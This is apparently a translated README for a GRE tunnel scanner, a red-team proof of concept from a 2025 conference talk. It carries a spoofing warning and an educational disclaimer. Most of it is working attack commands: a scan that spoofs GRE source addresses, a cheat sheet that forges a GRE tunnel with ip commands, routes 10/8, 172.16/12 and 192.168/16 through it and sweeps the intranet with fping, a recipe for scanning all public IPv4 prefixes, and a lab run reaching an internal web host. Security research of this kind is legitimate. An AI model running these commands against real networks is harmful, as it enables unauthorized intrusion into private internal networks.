# GRE 隧道扫描器
## ⚠️⚠️⚠️ 重要提示 ⚠️⚠️⚠️
### ⚠️该工具包含伪造源IP地址功能。请确保您拥有合法授权使用该工具。⚠️
## 参考资料
- 这是一个演讲的PoC代码：从伪造到隧道：红队初始访问与规避的新网络技术
    - [Black Hat USA 2025 简报](https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678)
    - [DEF CON 33 主舞台](https://defcon.org/html/defcon-33/dc-33-speakers.html#content_60316)
    - [HITCON 2025](https://hitcon.org/2025/en-US/agenda/)
## 准备
- `pip3 install requirement.txt`
## 使用方法
```
python3 main.py -i <interface> -lh <your_public_IP> -s <gre_src_ip_subnet or ip_list_file> -d  <gre_dst_ip_subnet or ip_list_file> -o <logfile>
```
## 示例
- 例如 `1.1.1.1` 和 `2.2.2.2` 之间有 gre 隧道，你是 `3.3.3.3`
```
python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2
INFO - sending gresrc 1.1.1.1, gredst 2.2.2.2
CRITICAL - Received reply from 2.2.2.2 GRE peer: 1.1.1.1
```
- 以及如何滥用GRE隧道
```
python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2 -sch -l3
########################## output ##########################
#### Create Fake Tunnel ####
IFACE=eth0
MYPUBIP=3.3.3.3
SRCADDR=1.1.1.1
DSTADDR=2.2.2.2
ip addr add  $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280

## route possible private ip ##
ip r add 10.0.0.0/8 dev gre1 src $MYPUBIP
ip r add 172.16.0.0/12 dev gre1 src $MYPUBIP
ip r add 192.168.0.0/16 dev gre1 src $MYPUBIP

### start scan intranet ###
#### !IMPORTANT! ####
# !! nmap is not available for this kind of attack use fping instead !! #
# fping -g 192.168.0.0/16

### cleanup ###
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1
```
- 如果你知道端点但不知道对端地址，你可以这样做  
  - `python3 main.py  -i eth0 -l3 -lh 3.3.3.3 -s 1.1.1.0/24 -d 2.2.2.2 -id 8.8.8.8`  
  - 你会从 8.8.8.8 得到回复，同时你会获得正确的对端  

- 默认设置大约 500 包/秒。  
## 选项  
- `-sch`: 显示速查表并退出（输入你找到的 -i -lh -s -d，然后获取滥用 GRE 隧道命令）  
- `-l3`: 第三层隧道接口（默认：False）  
- `-r`: 在 ICMP 中放置 GRE 目标 IP 信息（默认：放置 GRE 源 IP 信息）  
- `-ss`: 保存并使用状态文件（上次扫描将恢复）（默认：False）  
  - 在大规模扫描系统中推荐开启，有时会杀死脚本  
- `-i <interface>`: 发送包的接口  
- `-s <ip_or_file>`: 用作 GRE 源的 IP 子网或 IP（子网）列表  
- `-d <ip_or_file>`: 用作 GRE 目标的 IP 子网或 IP（子网）列表  
- `-L <file>`: 扫描 GRE 对端列表  
  - 文件每行格式如 `1.1.1.1,2.2.2.2`  
- `-lh <ip>`: 你公网接口上的一个 IP（-i 接口上的 IP）  
- `-o <file>`: 日志文件路径  
- `-t <float>`: 发送 GRE 包后等待多少秒（默认：2）  
- `-T <int>`: 同时发送 GRE 包的线程数（默认：255）  
- `-cs <int>`: 发送多少 IP 后开始等待 ping 响应（默认：1000）  
- `-dp`: 扫描私有 IP GRE（默认：False）  
- `-id <ip>`: ICMP 内部目标地址（默认：与 GRE 目标相同）  
  - 如果你知道内部内网地址，请使用此项  
- `-v <log_level>`: 日志级别 `['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']`（默认：INFO）  
  - GRE 对端发现日志级别为 `CRITICAL`  

## 更好的方法扫描完整公网 IP


```
wget https://bgp.tools/table.txt
cat table.txt |grep -v "::"|cut -d " " -f 1 > v4table.txt
pip3 install aggregate6
aggregate6 v4table.txt > aggrv4table.txt
#cat aggrv4table.txt|wc -l   #159652
python3 main.py -i  <interface> -lh <your_public_IP> -s aggrv4table.txt -d <your_target> -ss
```

## 实验
### 演示视频
- [Youtube](https://youtu.be/DDvfYl5-J28)
### 扫描GRE隧道
`python3 main.py -i <iface> -lh <your_ip> -s 1.1.1.1 -d 160.25.104.199`
### 访问并扫描内网
```
#### Create Fake Tunnel ####
IFACE=eth0  #change this 
MYPUBIP=9.9.9.9  #change this
GATEWAY=1.2.3.4 #change this
SRCADDR=1.1.1.1 # lab info don't change
DSTADDR=160.25.104.199 # lab info don't change
ip addr add $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE via $GATEWAY src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280
### start scan intranet ###
fping -g 192.168.0.0/16

##### scan output #####
# 192.168.1.2 is alive

## test curl to web ##
curl 192.168.1.2
# YOU KNOW GRE!

#### cleanup ####
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1
```
## 免责声明
本项目仅用于教育和研究目的。与本代码相关的任何行为和/或活动均由您自行负责。作者和贡献者不对因本项目造成的任何误用或损害承担责任。请确保在测试、使用或部署本代码的任何部分于任何环境之前，您已获得适当的授权。未经授权使用本代码可能违反当地、州和联邦法律。

## 许可协议
本项目遵循 MIT 许可协议条款。




---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-10-11

---